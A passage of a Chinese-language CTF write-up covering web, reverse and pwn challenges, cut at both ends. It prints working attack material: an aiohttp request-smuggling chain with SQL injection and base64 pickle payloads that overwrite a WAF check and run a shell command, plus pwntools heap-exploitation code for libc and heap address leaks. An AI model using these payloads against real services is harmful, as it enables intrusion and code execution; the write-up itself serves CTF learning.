AFEHAFAAAABEAAAABAABAEYAAgBVAAAAAgBWALsAAAAKAAEAdABxALoACQ=="))
```



然后再进行反序列化



```plain
unser=rO0ABXNyAAxFdmlsTWVtc2hlbGwx3CJ1tyzvvgIAAHhw
```



最后即可getshell



![image-1730940404450](./assets/image-1730940404450.png)

## 题目：OtenkiImp
**解题步骤**

F12 里有 hint，给了源码

```python
from aiohttp import web
import time
import json
import base64
import pickle
import time
import aiomysql
from settings import config, messages


async def mysql_init(app):
    mysql_conf = app['config']['mysql']
    while True:
        try:
            mysql_pool = await aiomysql.create_pool(host=mysql_conf['host'],
                                                    port=mysql_conf['port'],
                                                    user=mysql_conf['user'],
                                                    password=mysql_conf['password'],
                                                    db=mysql_conf['db'])
            break
        except:
            time.sleep(5)
    app.on_shutdown.append(mysql_close)
    app['mysql_pool'] = mysql_pool
    return app


async def mysql_close(app):
    app['mysql_pool'].close()
    await app['mysql_pool'].wait_closed()


async def index(request):
    with open("./static/index.html", "r", encoding="utf-8") as f:
        html = f.read()
    return web.Response(text=html, content_type="text/html")


async def waf(request):
    return web.Response(text=messages[0], status=403)


def check(string):
    black_list = [b'R', b'i', b'o', b'b', b'V', b'__setstate__']
    white_list = [b'__main__', b'builtins', b'contact', b'time', b'dict', b'reason']
    try:
        s = base64.b64decode(string)
    except:
        return False
    for i in white_list:
        s = s.replace(i, b'')
    for i in black_list:
        if i in s:
            return False
    return True


async def getWishes(request):
    wishes = []
    id = request.query.get("id")
    try:
        pool = request.app['mysql_pool']
        async with pool.acquire() as conn:
            async with conn.cursor() as cur:
                try:
                    id = str(int(id))
                    sql = 'select id,wish from wishes where id={id}'.format(
                        id=id)
                except:
                    sql = 'select id,wish from wishes'
                await cur.execute(sql)
                datas = await cur.fetchall()
    except:
        return web.Response(text=messages[1])
    for (id, wish) in datas:
        if check(wish):
            wishes.append(pickle.loads(base64.b64decode(wish)))
    return web.Response(text=json.dumps(wishes), content_type="application/json")


async def addWishes(request):
    data = {}
    if request.query.get("contact") and request.query.get("place") and request.query.get("reason") and request.query.get("date") and request.query.get("id"):
        data["contact"] = request.query.get("contact")
        data["place"] = request.query.get("place")
        data["reason"] = request.query.get("reason")
        data["date"] = request.query.get("date")
        data["timestamp"] = int(time.time()*1000)
        id = request.query.get("id")
        wish = base64.b64encode(pickle.dumps(data))
    else:
        return web.Response(text=messages[3])
    try:
        pool = request.app['mysql_pool']
        async with pool.acquire() as conn:
            async with conn.cursor() as cur:
                sql = 'insert into wishes(`id`, `wish`) values ({id}, "{wish}")'.format(
                    id=id, wish=wish.decode())
                await cur.execute(sql)
                return web.Response(text=messages[2])
    except:
        return web.Response(text=messages[1])


async def rmWishes(request):
    try:
        pool = request.app['mysql_pool']
        async with pool.acquire() as conn:
            async with conn.cursor() as cur:
                sql = 'delete from wishes'
                await cur.execute(sql)
                return web.Response(text=messages[2])
    except:
        return web.Response(text=messages[1])


async def hint(request):
    with open(__file__, 'r') as f:
        source = f.read()
    return web.Response(text=source)

if __name__ == '__main__':
    app = web.Application()
    app['config'] = config
    app.router.add_static('/static', path='./static')
    app.add_routes([web.route('*', '/', index),
                    web.route('*', '/waf', waf),
                    web.route('*', '/addWishes', addWishes),
                    web.get('/getWishes', getWishes),
                    web.post('/rmWishes', rmWishes),
                    web.get('/hint', hint)])
    app = mysql_init(app)
    web.run_app(app, port=5000)
```



在 getWishes 处有一个反序列化，反序列化串的内容在数据库中查出来的，找找有没有可以控制写入数据的点



在 addWishes 处存在一个注入点，可以用 id 拼接参数并注入恶意的反序列化数据进去



在反序列化前需要过一个 waf



```python
def check(string):
    black_list = [b'R', b'i', b'o', b'b', b'V', b'__setstate__']
    white_list = [b'__main__', b'builtins', b'contact', b'time', b'dict', b'reason']
    try:
        s = base64.b64decode(string)
    except:
        return False
    for i in white_list:
        s = s.replace(i, b'')
    for i in black_list:
        if i in s:
            return False
    return True
```



所有可能命令执行的都被 ban 了，所以考虑变量覆盖



这里涉及两个知识点：



1. python 中有一切皆对象的特点，函数也是对象，也可以被覆盖
2. 命名空间以字典方式存储在 `__dict__` 中



所以容易想到，将上面的 waf 覆盖成其他函数来 bypass，新函数需要接收 str 类型的参数并且返回 true



```python
any("k2436165")
#True
all("k2436165")
#True
str("k2436165")
#'k2436165'
```



实际操作的时候会发现，访问 /addWishes 和访问 /waf 返回的结果是相同的，所以可以猜到有一层反向代理



环境用到了 aiohttp，并且版本是 3.8.4，这个版本存在请求走私，官方 poc 如下



```shell
$ printf "POST / HTTP/1.1\r\nHost: localhost:8080\r\nX-Abc: \rxTransfer-Encoding: chunked\r\n\r\n1\r\nA\r\n0\r\n\r\n" \
  | nc localhost 8080

Expected output:
  headers: {'Host': 'localhost:8080', 'X-Abc': '\rxTransfer-Encoding: chunked'} body: b''

Actual output (note that 'Transfer-Encoding: chunked' is an HTTP header now and body is treated differently)
  headers: {'Host': 'localhost:8080', 'X-Abc': '', 'Transfer-Encoding': 'chunked'} body: b'A'
```



可以根据这个构造走私的数据包



至此，本题攻击路线已经完整



1. 通过请求走私访问 /addWishes
2. 利用 sql 注入将恶意序列化串写入数据库
3. 访问 /getWishes 触发反序列化并覆盖 `check()` 方法使其永真
4. 再次触发反序列化实习 RCE



请求走私构造数据包如下



```plain
GET /getWishes HTTP/1.1\r\nHost: localhost:8000\r\nk2436165: \rk\r\nGET /addWishes?contact=1&place=2&reason=3&date=4&id=1 HTTP/1.1\r\nHost: localhost:8000\r\n\r\n
```



sql 注入 payload 如下



```plain
/addWishes?contact=1&place=2&reason=3&date=4&id=2,"payload")%23
```



恶意序列化串如下



覆盖 `check()` 方法后把栈清空，然后重新压入正常数据防止服务器报 500（不压入正常数据也不影响命令执行



```plain
b"c__main__\n__dict__\n(S'check'\ncbuiltins\nany\nu0\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x07contact\x94\x8c\x011\x94\x8c\x05place\x94\x8c\x012\x94\x8c\x06reason\x94\x8c\x013\x94\x8c\x04date\x94\x8c\x014\x94\x8c\ttimestamp\x94\x8a\x06f`\x90\xfe\x8e\x01u."
```



命令执行，同理，压入正常数据防止报 500（不压入也不影响命令执行



```plain
b'(\x8c\x1acat /flag > ./static/1.txtios\nsystem\n0\x80\x04\x95K\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\x07contact\x94\x8c\x011\x94\x8c\x05place\x94\x8c\x012\x94\x8c\x06reason\x94\x8c\x013\x94\x8c\x04date\x94\x8c\x014\x94\x8c\ttimestamp\x94\x8a\x06f`\x90\xfe\x8e\x01u.'
```



因为 sql 查询结果是无序的，所以中间需要访问 /rmWishes 或者再次访问 /getWishes，也就是说，直接写入两条数据然后一次执行是有可能出现命令执行不完整的情况



最终 payload 如下



先打入覆盖 `check()` 的序列化串



```plain
GET /getWishes HTTP/1.1\r\nHost: localhost:8000\r\nk2436165: \rk\r\nGET /addWishes?contact=1&place=2&reason=3&date=4&id=2,"Y19fbWFpbl9fCl9fZGljdF9fCihTJ2NoZWNrJwpjYnVpbHRpbnMKYW55CnUwgASVSwAAAAAAAAB9lCiMB2NvbnRhY3SUjAExlIwFcGxhY2WUjAEylIwGcmVhc29ulIwBM5SMBGRhdGWUjAE0lIwJdGltZXN0YW1wlIoGZmCQ/o4BdS4=")%23 HTTP/1.1\r\nHost: localhost:8000\r\n\r\n
```



访问 /getWishes 触发反序列化，再访问 /rmWishes 将之前的序列化串删除



```http
GET /getWishes HTTP/1.1
Host: localhost:8000

POST /rmWishes HTTP/1.1
Host: localhost:8000
```



最后打入命令执行



```plain
GET /getWishes HTTP/1.1\r\nHost: localhost:8000\r\nk2436165: \rk\r\nGET /addWishes?contact=1&place=2&reason=3&date=4&id=2,"KIwaY2F0IC9mbGFnID4gLi9zdGF0aWMvMS50eHRpb3MKc3lzdGVtCjCABJVLAAAAAAAAAH2UKIwHY29udGFjdJSMATGUjAVwbGFjZZSMATKUjAZyZWFzb26UjAEzlIwEZGF0ZZSMATSUjAl0aW1lc3RhbXCUigZmYJD%2bjgF1Lg==")%23 HTTP/1.1\r\nHost: localhost:8000\r\n\r\n
```



再次访问 /getWishes 触发反序列化，flag 在 /static/1. txt ，直接访问即可



```http
GET /getWishes HTTP/1.1
Host: localhost:8000

GET /static/1.txt HTTP/1.1
Host: localhost:8000
```

# REVERSE
## 题目：FinalEncrypt
解题思路

附件给了三个文件，一个是`FinalEncrypt`，一个是`flag.md.enc`，一个是`Encryption.exe.enc`  
明显两个加密文件，先看看`FinalEncrypt`  
直接运行，回显提示了用法  
![image-1730940404946](./assets/image-1730940404946.png)  
用 IDA64 反编译一下，关键点在后面  
![image-1730940405491](./assets/image-1730940405491.png)  
跟进一下文件加密函数，可以看到是对文件进行了chacha20加密  
![image-1730940406076](./assets/image-1730940406076.png)  
直接解密较难操作，考虑用 FinalEncrypt 加密一个文件，然后用同样的随机数种子去生成密钥，再用 FinalEncrypt 解密  
首先是我们保持文件的修改时间不变，从压缩包中提取文件  
`tar --atime-preserve -xvf encrypted.tar.xz`  
然后用 `stat` 命令查看文件的访问时间  
![image-1730940406614](./assets/image-1730940406614.png)  
得到两文件的修改时间`2024-05-08 16:20:22.000000000 +0800`和`2024-05-08 16:21:59.000000000 +0800`  
然后将这两个时间转换成Unix时间戳  
[Unix时间戳转换](https://time.is/Unix_time_converter)  
得到`1715156422` 和`1715156519`  
![image-1730940407204](./assets/image-1730940407204.png)  
随便生成一个测试文件  
`echo "test" > test.txt`  
GDB 调试 FinalEncrypt  
`gdb --args ./FinalEncrypt -re test.txt`  
在 time 函数处下断，开始调试



```plain
b time
r
```



![image-1730940407675](./assets/image-1730940407675.png)  
一直按 `n` 步过，到这条汇编语句  
明显这两条语句是调用了寄存器`rax`的值作为随机数种子  
然后调用 `srand` 函数  
用 `set $rax=1715156422` 修改 `rax` 的值  
然后按 `c` 继续执行  
![image-1730940408410](./assets/image-1730940408410.png)  
获得了`Encryption.exe.enc`加密的key  
`507CD82354B1A821ED46A45FAF06D53D0F941C24E085D511F244410B2666056462E126287107616B308DDB193B62036C89C7112C8E713828BC8E8C5079ED221A`  
![image-1730940409031](./assets/image-1730940409031.png)  
同理，我们可以得到`flag.md.enc`的key  
`CB0C24457D0BE9695EFDD94C533DE2036E0E6E706C1B06471DBE334DA3195C32F46C8078C7311D068270A10EAE446D0553FA1F628CE4336A39DA852730625324`  
![image-1730940409536](./assets/image-1730940409536.png)  
然后我们用这两个key去解密两个文件  
`./FinalEncrypt -d Encryption.exe.enc 507CD82354B1A821ED46A45FAF06D53D0F941C24E085D511F244410B2666056462E126287107616B308DDB193B62036C89C7112C8E713828BC8E8C5079ED221A`  
`./FinalEncrypt -d flag.md.enc CB0C24457D0BE9695EFDD94C533DE2036E0E6E706C1B06471DBE334DA3195C32F46C8078C7311D068270A10EAE446D0553FA1F628CE4336A39DA852730625324`  
![image-1730940410054](./assets/image-1730940410054.png)  
`flag.md`文件为密文`e07816e1dba1da61536634bef2c3b6346d533cc3b6b834e3beb634c80264143c34e36400bb4daa6902ff643414e3b8344dff6634b8b66db6bbc33834143461ab147e04`  
看看 Encryption.exe  
加密逻辑就是用随机数生成v8的首位，然后进行一系列变换生成一个加密表，最后加密flag  
![image-1730940410755](./assets/image-1730940410755.png)  
**ROR1**是ida的内置位移函数可以在ida/plugins/defs.h查看**ROR1**定义  
![image-1730940411344](./assets/image-1730940411344.png)  
![image-1730940412188](./assets/image-1730940412188.png)



有两个参数：(value, int count)  
第一个参数为左移的数，第二个参数为左移的位数。  
如果第二个参数值为负数，则实际上为循环右移 -count位。  
该函数的实现细节为：  
先得到value的位数，然后count对位数取模。  
如果count值大于0，则先右移-count取模的结果，然后在左移取模的结果，得到的两个数相或，即为循环左移的结果。  
如果count值小于0，先左移在右移即可。  
举例来说： value = 0110， count = 6  
value为4位数， 6 % 4 = 2，  
0110先右移4-2=2位，得到0001，然后在左移2位，得到1000，0001 | 1000结果为1001，即循环左移结果为1001。



理解了这个函数，我们可以模拟加密表的生成方式生成加密表，爆破查找正确的加密表来解密flag  
因为根据加密结果来看，加密表的值不超过0xff，所以我们可以爆破第一个字节，然后用相同的方法生成剩余的字节  
ida生成的伪代码可以直接使用，最后的exp如下



**exp**



```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string>
#include <sstream>
#include <string.h>
int __ROR1__(unsigned __int8 value,int x){
	value= (value>>x) | (value<<(8-x));
	return value;	
} 
 
int main(){
	unsigned int v1; // eax
	char v2; // al
	char v3; // al
	int v4; // ecx
	int v5; // eax
	int v6; // ecx
	int v7; // eax
	int v8; // ecx
	int v9; // eax
	int v10; // ecx
	int result; // eax
	char v12; // [esp+1Ah] [ebp-Eh]
	unsigned __int8 v13; // [esp+1Bh] [ebp-Dh]
  	char v14; // [esp+1Bh] [ebp-Dh]
  	char v15; // [esp+1Bh] [ebp-Dh]
  	int v16; // [esp+1Ch] [ebp-Ch]
	unsigned __int8 a1[256]={0};
	int i;
  for(i=1; i<256; i++){
  		memset(a1,0,sizeof(a1));
  		a1[0] = i;
  		v12 = 1;
  		v13 = 1;
  		do
  		{
    		if ( v12 >= 0 )
      			v2 = 0;
    		else
      			v2 = 27;
    		v12 ^= (2 * v12) ^ v2;
    		v14 = (4 * ((2 * v13) ^ v13)) ^ (2 * v13) ^ v13;
    		v15 = (16 * v14) ^ v14;
    		if ( v15 >= 0 )
      			v3 = 0;
    		else
      			v3 = 9;
    		v13 = v15 ^ v3;
    		v4 = v13;
    		v4 = __ROR1__(v13, 7);
    		v5 = v4 ^ (v13 ^ *a1);
    		v6 = v13;
    		v6 = __ROR1__(v13, 6);
    		v7 = v6 ^ v5;
    		v8 = v13;
    		v8 = __ROR1__(v13, 5);
    		v9 = v8 ^ v7;
    		v10 = v13;
    		v10 = __ROR1__(v13, 4);
    		result = v10 ^ v9;
    		a1[v12] = result;
  		}while ( v12 != 1 );
  		if(a1[0x44]==0xe0 && a1[0x41]==0x78 && a1[0x53]==0x16 && a1[0x43]==0xe1 && a1[0x54]==0xdb && a1[0x46]==0xa1 ){//用DASCTF前缀验证加密表的正确性
            printf("随机种子为%d\n",i);
            break;
        }
  	} 
  for(i=0; i<256; i++){
  		if(i%16 == 0) printf("\n");
      printf("0x%02x ",a1[i]);
        
	}
  std::string enc = "e07816e1dba1da61536634bef2c3b6346d533cc3b6b834e3beb634c80264143c34e36400bb4daa6902ff643414e3b8344dff6634b8b66db6bbc33834143461ab147e04";
  std::string flag = "";
  for (size_t i = 0; i < enc.length(); i += 2) {
        std::string byteString = enc.substr(i, 2);
        int s1;
        std::istringstream(byteString) >> std::hex >> s1;
        for(int j=0; j<256; j++){
            if(a1[j] == s1){
                flag += (char)j;
                break;
            }
        }
    }
    
    printf("\n%s\n",flag.c_str());
}
/*
随机种子为152

0x98 0x87 0x8c 0x80 0x09 0x90 0x94 0x3e 0xcb 0xfa 0x9c 0xd0 0x05 0x2c 0x50 0x8d
0x31 0x79 0x32 0x86 0x01 0xa2 0xbc 0x0b 0x56 0x2f 0x59 0x54 0x67 0x5f 0x89 0x3b
0x4c 0x06 0x68 0xdd 0xcd 0xc4 0x0c 0x37 0xcf 0x5e 0x1e 0x0a 0x8a 0x23 0xca 0xee
0xff 0x3c 0xd8 0x38 0xe3 0x6d 0xfe 0x61 0xfc 0xe9 0x7b 0x19 0x10 0xdc 0x49 0x8e
0xf2 0x78 0xd7 0xe1 0xe0 0x95 0xa1 0x5b 0xa9 0xc0 0x2d 0x48 0xd2 0x18 0xd4 0x7f
0xa8 0x2a 0xfb 0x16 0xdb 0x07 0x4a 0xa0 0x91 0x30 0x45 0xc2 0xb1 0xb7 0xa3 0x34
0x2b 0x14 0x51 0x00 0xb8 0xb6 0xc8 0x7e 0xbe 0x02 0xf9 0x84 0xab 0xc7 0x64 0x53
0xaa 0x58 0xbb 0x74 0x69 0x66 0xc3 0x0e 0x47 0x4d 0x21 0xda 0xeb 0x04 0x08 0x29
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
DASCTF{7ou_h@ve_5o1ved_4he_fina1_4ncrypti0n_a4d_y0u_de5erv3_a_7lag}
*/
```

## 题目：baby_rop
解题思路

简单运行一下提示输入flag  
![image-1730940413047](./assets/image-1730940413047.png)  
用ida打开发现是一个rop题目，静态看不到什么有用的信息  
用动态调试看一下  
前面是一些读入和随机数的初始化，不用太关注  
运行到这里会有一个flag长度的比较  
如果长度为32位，寄存器`RDI`和`RSI`的值相等，就会继续往下走，否则会直接退出  
![image-1730940413775](./assets/image-1730940413775.png)  
继续往下运行，会得到key的值`HDIN2024`  
![image-1730940414296](./assets/image-1730940414296.png)  
同时运行进入 `500044`函数可以发现对输入进行了异或和加  
![image-1730940414827](./assets/image-1730940414827.png)  
继续往下运行可以发现比较  
`RDI`存放输入加密后的结果，`RSI`存放密文  
![image-1730940415346](./assets/image-1730940415346.png)  
如果`RDI`和`RSI`相等，就会继续往下走，否则会直接退出  
所以要每次输入正确8位后，再次调试到这里进行获取下一个8位的密文进行解密  
如此循环，直到解密完整个密文

**exp**

```python
enc = [11131674077274786132, 10336780887984666816, 4152170666298469215, 9026692794781294446]
key_chunks = [int.from_bytes(b'HDIN2024', byteorder='little')]

flag = ''
for i in range(len(enc)):
    result = int.to_bytes((enc[i] - key_chunks[0]) ^ key_chunks[0], length=8, byteorder='little')
    flag += result.decode('utf-8')

print(flag)
# DASCTF{R0p_is_so_cr34y_1n_re!!!}
```

## 题目：RealeazyRealeazy
**解题思路**

在刚进入该题目时，首先看到的应该是`MainActivity`，这里是一个魔改的`xtea`。这里如果分析一下的话会发现输入的前五个字节根本没有被使用到，再者如果看下控件对应的方法或者`xml`文件的属性，甚至于弹窗的语句都是有一点不一样的，都可以发现这个`Activity`是假的。真正的默认启动活动是`ProxyActivity`。  
但是假如说这些都没有发现的话，那么这里以java代码来解开这个Tea也是提示性的flag。  
![image-1730940415871](./assets/image-1730940415871.png)  
明文为`flag??{Thisafakeflaghhh}`  
当我们进入`ProxyActivity`时，会发现主要调用了一个本地方法。  
![image-1730940416489](./assets/image-1730940416489.png)  
当我进入so文件库进行查看时，这个文件所有的函数被加了混淆  
![image-1730940416932](./assets/image-1730940416932.png)  
这里的混淆是间接跳转加平坦化。  
写脚本或者其他方法去掉混淆后  
![image-1730940417495](./assets/image-1730940417495.png)  
前五位作为`dword_708`的索引进行一个校验，使用`z3`求解即可，但是这里真的很丑陋。  
这部分源码  
![image-1730940418081](./assets/image-1730940418081.png)



```python
from z3 import*
key=[BitVec("%d"% i,16)for i in range(5)]
s=Solver()
array2=[127, 127, 122, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79,
            78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 59, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31,
            30, 29, 28, 27,
            26, 25, 24, 23, 23, 21, 20, 19, 18, 17, 16, 15, 14,
            13, 12, 11, 10, 8, 8, 7, 6, 5, 4, 3, 2, 1, 0]
S=Array("S",BitVecSort(16),BitVecSort(16))
for i in range(5):
    s.add(key[i]>0)
    s.add(key[i]<128)
for i, v in enumerate(array2):
    s.add(S[i] == v)
s.add(((Select(S,key[2])*key[2]+Select(S,key[1]))*2^4)==6064)
s.add((Select(S,key[3])+Select(S,key[2])+Select(S,key[1]))^(key[1]+key[2]+key[3])==126)
s.add(Select(S,key[3])*3^Select(S,key[0])==227)
s.add(Select(S,key[3])^1234^Select(S,key[2])-234==-1112)
s.add((key[4]^key[3]-key[0]^2)+100==0)
if s.check()==sat:
    result=s.model()
    key_values = [result[key[i]].as_long() for i in range(5)]
    print(key_values)
else:
    print("no")
```



![image-1730940418574](./assets/image-1730940418574.png)  
解出`key`后会发现`key`进行一种运算生成了七个大数。`%48`是为了保证是`0`到`9`  
![image-1730940419104](./assets/image-1730940419104.png)  
![image-1730940420131](./assets/image-1730940420131.png)  
然后进行了大数运算最后校验。  
由于我没有实现大数除法(真的很抱歉)所以都只是简单的加减，唯一的乘法也只是用来生成加减的数上。  
所以只需要从网上搜索大数运算脚本或者在线网站应该都是可以实现的。  
解出后24位输入为`114514131452125252550000`  
最终输入为： `rea1!114514131452125252550000`  
`Flag{114514131452125252550000}`

**exp**

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
void init_getString();
void addBigNumbers(char* num1, char* num2, char* result);
void multiplyBigNumbers(char* num1, char* num2, char* result);
void subtract(char* num1, char* num2);
void divideBigNumbers(char* dividend, char* divisor, char* quotient, char* remainder);
void subtractBigNumbers(char* num1, char* num2, char* result);
int main() {
    char result[15][50] = { 0 };
    char str2[8][50] = { "196953039747318175251969","087842128656209064340878","314775811925536997033147","205664900834427886122056","550317693381954711697325","441206782290845600786234","778139475569172533479503","669028564478063422568412" };
    multiplyBigNumbers(str2[6], str2[7], result[11]);
    multiplyBigNumbers(str2[3], str2[2], result[2]);
    char ccc[50] = "656162506106829140369823576190558316391273550953";
    strcpy(result[12], ccc);
    subtractBigNumbers(result[12], result[11], result[13]);
       addBigNumbers(result[13],str2[5],result[6]);
       subtractBigNumbers(result[6],str2[4],result[7]);
       subtractBigNumbers(result[7],result[2],result[8]);
      addBigNumbers(result[8],str2[1],result[9]);
    
       subtractBigNumbers(result[9],str2[0],result[10]);
       printf("%s", result[10]);
}
void reverse(char* str)
{
    int len = strlen(str);
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--)
    {
        char temp = str[i];
        str[i] = str[j];
        str[j] = temp;
    }
}

void addBigNumbers(char* num1, char* num2, char* result)
{
    int carry = 0;
    int i = 0;

    int len1 = strlen(num1);
    int len2 = strlen(num2);
    int maxLen = (len1 > len2) ? len1 : len2;

    for (i = 0; i < maxLen; i++)
    {
        int digit1 = (i < len1) ? num1[len1 - 1 - i] - '0' : 0;
        int digit2 = (i < len2) ? num2[len2 - 1 - i] - '0' : 0;

        int sum = digit1 + digit2 + carry;
        result[i] = (sum % 10) + '0';
        carry = sum / 10;
    }

    if (carry > 0)
    {
        result[i] = carry + '0';
        i++;
    }

    result[i] = '\0';
    reverse(result);
}

void multiplyBigNumbers(char* num1, char* num2, char* result)
{
    int len1 = strlen(num1);
    int len2 = strlen(num2);

    int i, j, k;
    int* products = (int*)malloc(sizeof(int) * (len1 + len2));

    // 初始化数组
    for (i = 0; i < len1 + len2; i++)
    {
        products[i] = 0;
    }

    // 逐位相乘
    for (i = len1 - 1; i >= 0; i--)
    {
        for (j = len2 - 1; j >= 0; j--)
        {
            int digit1 = num1[i] - '0';
            int digit2 = num2[j] - '0';

            int product = digit1 * digit2;

            int pos1 = i + j;
            int pos2 = i + j + 1;

            int sum = product + products[pos2];

            products[pos1] += sum / 10;
            products[pos2] = sum % 10;
        }
    }
    // 构建结果字符串
    int index = 0;
    for (i = 0; i < len1 + len2; i++)
    {
        if (index == 0 && products[i] == 0)
        {
            continue; // 忽略结果字符串开头的0
        }

        result[index] = products[i] + '0';
        index++;
    }

    if (index == 0) // 如果结果为0，则将结果设置为"0"
    {
        result[index++] = '0';
    }

    result[index] = '\0';

    free(products);
    reverse(result);
}
void subtractBigNumbers(char* num1, char* num2, char* result) {
    int len1 = strlen(num1);
    int len2 = strlen(num2);
    int diff[100] = { 0 }; // 存储差值的数组，假设结果长度不超过100

    // 逐位相减并存储在 diff 数组中
    int borrow = 0;
    int i;
    for (i = 0; i < len1 || i < len2; i++) {
        int digit1 = (i < len1) ? num1[len1 - 1 - i] - '0' : 0;
        int digit2 = (i < len2) ? num2[len2 - 1 - i] - '0' : 0;
        int diffDigit = digit1 - digit2 - borrow;
        if (diffDigit < 0) {
            diffDigit += 10;
            borrow = 1;
        }
        else {
            borrow = 0;
        }
        diff[i] = diffDigit;
    }

    // 从 diff 数组中提取结果字符串
    while (i > 0 && diff[i - 1] == 0) {
        i--;
    }

    if (i == 0) {
        strcpy(result, "0"); // 结果为零的情况
    }
    else {
        int j = 0;
        while (i > 0) {
            result[j++] = diff[--i] + '0';
        }
        result[j] = '\0';
    }
}
void subtract(char* num1, char* num2) {
    int len1 = strlen(num1);
    int len2 = strlen(num2);

    // 借位标志
    int borrow = 0;

    for (int i = 0; i < len2; ++i) {
        int diff = (num1[i] - borrow) - num2[i];
        if (diff < 0) {
            diff += 10;
            borrow = 1;
        }
        else {
            borrow = 0;
        }
        num1[i] = diff + '0';
    }

    // 处理高位的借位
    for (int i = len2; i < len1 && borrow; ++i) {
        int diff = (num1[i] - borrow) - '0';
        if (diff < 0) {
            diff += 10;
            borrow = 1;
        }
        else {
            borrow = 0;
        }
        num1[i] = diff + '0';
    }
}
```

# PWN
## 题目：PRETTYez
解题步骤

**漏洞点**

+ 这道题的漏洞点在于堆溢出，比较特殊的两点是只能delete或者show当前的chunk，并且在当前的chunk没有被释放的时候不允许继续add 
    - 上述的两个特点导致这道题的攻击难度骤增，不过我们还是要跟普通堆题一样，首先泄露地址，然后考虑攻击点
+ 而这道题还有一个重点，没有对stdin创建缓冲区，即没有setvbuf(stdin)，并且在getint函数中对此举的目的有所提示： 
    - ![[Pasted image 20240522172539.png]]
    - 注意看scanf的格式化参数：首先是读入一个整数并存入v2，然后读入字符但不存储该字符
+ 由于我们没有对stdin创建缓冲区，所以在scanf函数中



**思路**

+ libc地址泄露(house of orange)
+ 我们为了得到unsorted bin，只能利用house of orange 的打法，即把top chunk的size改小，然后malloc 一个比top chunk大的chunk 
    - 而这个chunk我们利用scanf来malloc，当没有进行`setvbuf(stdin，0)`的时候，scanf就会调用malloc来创建缓冲区，具体而言，当我们scanf时输入0x1000字节数据，就会执行以下操作：



```plain
p =malloc(0x800);
p =realloc(p, 0x1000);
p =realloc(p, 0x2000);
free(p)
```



+ 此时就可以把topchunk放到unsorted bin中了
+ 需要注意的是，在Glibc2.29中就添加了对unsorted bin的限制： 
    - ![[Pasted image 20240425164716.png]]
+ 此时为了我们放到unsorted bin中的topchunk不会出错，系统会自动在下面创建两个chunk(可以注意下面两个chunk都是0x10大小，这不是用户能创建出来的大小，只有prevsize和size域)： 
    - ![[Pasted image 20240522225107.png]] 
        * 其中X是用来满足unsortedbin的各种条件的，而Y是防止X发生unlink：**试想一下，如果没有Y块，那么X块没有被使用的，如果申请一个刚好大小为当前unsortbin的块，再释放，那么就会触发向前合并unlink，之后由于X块的fd和bk指针问题，导致程序crash**
+ 指针问题，导致程序crash**



```python
add(1, b"a" * 0x48 + p64(0xd11))


show2(0x1000)#利用scanf中的malloc

free()

add(1, b"a" * 0x50)
show()
io.recvuntil(b"Data: " + b"a" * 0x50)
libc_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) - 0x219ce0
log.success(f"libc_base : {libc_base:#x}")

free()
```



+ 此时的堆块结构为：
+ ![[Pasted image 20240425223318.png]]
+ 这里由于我们为了laek将unsorted bin chunk的size给修改了，导致gdb显示错误，我们下一步首先是要利用0x50chunk来溢出将size修改正常



**堆地址泄露（利用tcache fd）**

+ 堆地址的泄露相对来说比较方便，既然我们有堆溢出，那么我们就溢出到下一个tcache中来leak出tcache 的fd地址
+ 在glibc2.32后对tcache的fd指针加了异或： 
    - 在将chunk放进tcache的时候，会对其fd指针进行操作
    - ![[Pasted image 20240427230059.png]]
    - ![[Pasted image 20240425223637.png]]
    - 当往tcache 中放入第一个chunk的时候，此时它的fd=0 ^（heap_addr >>12），也就等于heap_addr>>12
    - 所以我们就能获取堆地址了
+ 接下里就进行如下构造：我们已经有一个0x50的chunk 放置于tcache中了，称之为A；接下来通过切割从unsorted bin中切割出一个0xa0大小的chunk B，并将其释放到tcache中；然后利用A的溢出来将B的fd位置leak



```python
add(1, b"a" * 0x48 + p64(0xcf1))#恢复unsorted bin的size
free()

add(2, b"a")   #从unsorted bin中切割一个chunk出来，位于0x50chunk的后面
free()

add(1, b"aaaa")
free()


add(2, b"aaaa")
free()      #这两行是多余的操作，这里这里反复的申请和free是为了leak出heapbase，具体来说就是为了将小chunk放在大chunk前面，通过溢出顺带leak出抑或后的tcache chunk->fd


add(1, b"a" * 0x50)

show()

io.recvuntil(b"Data: " + b"a" * 0x50)
heap_base = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00")) << 12
log.success(f"heap_base : {heap_base:#x}")

free()
```



+ 此时的堆块结构为：
+ ![[Pasted image 20240522225447.png]]
+ 这里由于我们为了leak heap地址，也修改了0xa0chunk的size，导致显示错误，在内存中可以看到原先0xcf0大小的chunk切割出0x90后还剩0xc60。
